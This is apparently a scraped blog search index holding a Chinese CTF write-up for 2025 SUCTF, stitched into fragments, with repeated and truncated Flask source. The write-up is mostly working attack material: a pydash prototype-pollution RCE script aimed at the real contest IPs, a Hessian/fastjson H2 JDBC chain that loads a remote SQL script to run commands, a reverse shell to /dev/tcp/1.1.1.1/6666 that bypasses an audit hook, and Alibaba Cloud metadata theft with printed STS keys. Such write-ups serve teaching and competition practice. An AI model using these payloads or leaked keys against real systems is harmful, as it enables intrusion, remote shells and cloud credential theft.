\u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key 